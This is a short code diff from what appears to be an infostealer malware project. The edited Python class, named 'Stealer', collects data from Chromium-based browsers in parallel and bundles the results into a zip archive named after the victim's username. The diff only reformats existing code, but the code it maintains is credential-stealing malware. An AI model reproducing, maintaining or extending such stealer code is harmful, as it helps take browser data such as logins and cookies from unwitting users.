@@ -32,17 +32,13 @@ class Stealer(Thread):
             with Pool(processes=5) as pool:
                 results = pool.starmap(
                     functions.run_process,
-                    [
-                        (Chromium, data)
-                        for data in BrowsersData
-                    ],
+                    [(Chromium, data) for data in BrowsersData],
                 )
             pool.close()
             output_file_path = f"{getuser()}.{random()}.zip"
             self.__storage.create_zip(
                 [file for files in results if files for file in files], output_file_path
             )
-
 
         except Exception as e:
             print(f"[Multi stealer]: {repr(e)}")
